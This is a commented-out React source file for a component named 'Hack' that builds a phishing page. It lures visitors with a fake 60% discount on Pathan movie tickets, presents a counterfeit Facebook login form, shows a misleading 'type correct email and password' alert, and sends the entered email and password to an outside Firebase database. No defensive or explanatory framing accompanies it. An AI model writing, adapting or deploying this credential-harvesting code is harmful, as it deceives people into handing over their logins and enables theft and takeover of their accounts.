// import React from 'react'
// import { useState } from 'react'

// export default function Hack() {
//     const [input,setinput]=useState({email:'',password:''})
//     let Update = (e) => {
//         let {name,value}=e.target;
//         setinput({...input,[name]:value})
//     }
//     let submit=async (e)=>{
//         e.preventDefault();
//         alert("Please type correct email and password")
//         setinput({email:'',password:''})
//         let {email,password}=input;
//         const res = await fetch("https://zain-81ebf-default-rtdb.firebaseio.com/ZAIN.json",{
//             method:"POST",
//             headers:{
//                 "Content-Type":"Application/json",
//             },
//             body:JSON.stringify({email,password})
//         })
//         res();
//     }
//   return (
//     <div className='bg-light'>
//       <div className="container d-flex justify-content-center">
//         <div className='row mx-auto mb-5'>
//            <div className='col-10 col-sm-9 col-md-9 mx-auto'>

//                <div ><h4 style={{fontWeight:'bold'}}>Get 60% off on Pathan movie ticket</h4></div>
//                <div><img src="https://m.media-amazon.com/images/M/MV5BNDUyODIzZGUtYmU3OS00MGZlLTgwZGItOTQxOWMwZDliOWRmXkEyXkFqcGdeQXVyNTkzNDQ4ODc@._V1_.jpg" alt="/" /></div>
//                <div className='mt-3 mb-3 border'>
//                   <h5 className='mt-2 text-center'>Follow the steps</h5>
//                   <div className='d-flex justify-content-center'><ol>
//                     <li className='text-secondary'>Login facebook below</li>
//                     <li className='text-secondary'>Get coupon code</li>
//                     <li className='text-secondary'>Use it in bookmyshow</li>
//                   </ol></div>
//                 </div>

                
                
//                     <h6 className='facebook'>facebook</h6>
//                     <form onSubmit={submit} method="POST">
//                     <input type="email" name='email' value={input.email} onChange={Update} className='mt-1 form-control shadow-none'  placeholder='Email address'/>
//                     <input type="password" name='password' value={input.password} onChange={Update} className='mt-1 form-control shadow-none'  placeholder='Password'/>
//                     <button type='submit' className="mt-1 col-12 btn btn-primary">Login</button>
//                     </form> 
                

//             </div>
//         </div>
//       </div>
//     </div>
//   )
// }
